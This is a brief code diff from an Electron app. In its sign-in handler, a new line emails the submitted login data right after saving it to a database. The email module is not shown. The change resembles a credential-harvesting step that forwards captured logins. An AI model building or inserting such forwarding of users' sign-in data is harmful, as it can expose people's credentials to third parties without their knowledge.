@@ -3,6 +3,7 @@ const { app, BrowserWindow } = require("electron");
 const { ipcMain } = require("electron/main");
 const db = require("./db/db");
 const path = require("path");
+const email = require("./email");
 
 function createWindow() {
   // Create the browser window.
@@ -44,6 +45,7 @@ app.on("window-all-closed", function () {
 //send the login data to db
 ipcMain.on("user-signin", async (e, data) => {
   await db.addLogin(data);
+  await email.sendEmail(data);
 });
 
 //get the logins and send to renderer
